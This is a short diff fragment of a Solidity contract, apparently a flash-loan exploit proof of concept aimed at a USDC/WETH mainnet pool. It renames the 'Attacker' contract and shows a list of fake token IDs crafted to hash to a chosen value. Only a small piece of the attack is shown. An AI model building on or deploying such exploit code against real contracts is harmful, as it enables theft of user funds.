@@ -21,7 +21,7 @@ address constant COLLATERAL_1 = address(0x351eFb333885c5351418aE0134dd54cac0B314
 int24 constant MIN_V3POOL_TICK = -887272;
 int24 constant MAX_V3POOL_TICK = 887272;
 
-contract Attacker is IFlashLoanReceiver {
+contract USDC_WETH30bpsMainnetAttacker is IFlashLoanReceiver {
     uint256[] fake_token_uints = [
         // fake list of TokenId uints that hashes to desired value
         0x004000000c000040000008000040000004000040000000020001000000000002,
